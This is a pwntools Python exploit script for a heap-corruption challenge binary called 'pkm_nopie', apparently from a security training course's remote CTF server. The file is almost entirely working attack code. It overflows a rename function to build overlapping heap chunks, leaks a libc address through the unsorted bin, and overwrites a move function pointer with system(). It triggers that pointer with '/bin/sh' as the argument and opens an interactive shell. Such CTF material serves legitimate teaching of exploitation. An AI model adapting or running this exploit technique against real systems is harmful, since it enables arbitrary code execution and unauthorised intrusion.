import IPython
from pwn import *

bin = ELF("./pkm_nopie")
libc = ELF("./libc-2.27_notcache.so")
context.terminal = ['tmux', 'splitw', '-h']


if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote("bin.training.jinblack.it", 2025)
else:
    r = process("./pkm_nopie")
    commands = """
    b *0x00401a0a   
    b system
    c
    """
    gdb.attach(r, commands)


def add():
    r.recvuntil(b'> ')
    r.sendline(b"0")


def rename(id, name):
    r.recvuntil(b'> ')
    r.sendline(b"1")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % id)
    r.sendline(b"%d" % len(name))
    r.sendline(name)


def kill(id):
    r.recvuntil(b'> ')
    r.sendline(b"2")
    r.recvuntil(b'> ')
    r.sendline(b"%d" % id)


def info(id):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % id)
    info = r.recvuntil(b"***************")
    info = info.split(b"\n")
    for i in range(0, len(info)):
        print(info[i])


def build_pkm_string(atk=0x0, defe=0x0, health=0x1000, ptr_name=0x0402036, ptr_move=None) -> bytes:
    # ret = b"\x2F\x62\x69\x6E\x2F\x73\x68\x00"
    ret = b""
    ret += p64(0x0068732f6e69622f) + p64(0x0068732f6e69622f)  # atk and def
    ret += p64(health) + p64(health)  # health and tot_health
    ret += p64(ptr_name) + p64(ptr_name)  # unused and char_name*
    ret += p64(0x4)  # id_number
    for _ in range(0, 4):
        ret += p64(0x1)
    # Start move array
    if ptr_move is not None:
        ret += p64(0x0402036)  # name first move
        ret += p64(ptr_move)
    ret += b"\x00" * (0xf8 - len(ret))
    return ret


def leak_base_libc() -> hex:
    r.recvuntil(b'> ')
    r.sendline(b"4")
    r.recvuntil(b"[*] Choice a PKM!")
    r.sendline(b"4")
    rec = r.recvuntil(b"***************")
    rec = rec[rec.find(b'*Name: ') + len(b'*Name: '):]
    rec = rec[:rec.find(b'\n')] + b'\x00' * 2
    head_unsorted_bin = u64(rec)
    log.info("[!] head_unsorted_bin@libc: %#x" % head_unsorted_bin)
    return head_unsorted_bin - 4074624


def fight(id_1, id_2):
    r.recvuntil(b'> ')
    r.sendline(b"3")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % id_1)
    r.recvuntil(b"> ")
    r.sendline(b"0")
    r.recvuntil(b"> ")
    r.sendline(b"%d" % id_2)


for i in range(0, 3):
    add()

rename(0, b"i" * 0x108)  # overflow here
rename(1, b"i" * 0x208)
rename(2, b"i" * 0x100)  # barrier

kill(1)  # Free name of 1
add()  # fill empty space between pkms (0, free space, 2)
rename(0, b"i" * 0x108)  # THIS IS THE "EXPLOITED BUG"

add()  # B1 (pkm id 3)- start to fill free space of B name
add()  # B2 (pkm id 4)

kill(3)  # free B1
kill(2)  # free C (Barrier) - Top chunk consolidate
add()  # fill empty space between pkms

#   Now we have multiple chucks at top of heap and a pkm inside the TopChuck

# We create a perfect overlap between our "hide" chuck (B2) and a new chuck
rename(1, b"U" * 0x100 + build_pkm_string(ptr_name=0x405210))
kill(2)
libc_base = leak_base_libc()
log.info("[!] base@libc: %#x" % libc_base)


# Create another section of chuck to repeat overlap between chucks

for i in range(0, 3):
    add()

rename(2, b"i" * 0x108)  # overflow here
rename(3, b"i" * 0x208)
rename(5, b"i" * 0x100)  # barrier

kill(3)  # Free name of 1
add()  # fill empty space between pkms (0, free space, 2)
rename(2, b"i" * 0x108)  # THIS IS THE "EXPLOITED BUG"

add()  # B1 (pkm id 6)- start to fill free space of B name
add()  # B2 (pkm id 7)

kill(6)  # free B1
kill(5)  # free C (Barrier) - Top chunk consolidate
add()  # fill empty space between pkms
system_add = libc_base + 321008
log.info("[!] System@libc: %#x " % system_add)
rename(3, b"U" * 0x100 + build_pkm_string(ptr_move=system_add))

fight(7, 5)
# input("Trigger")
r.sendline("ls")
r.interactive()
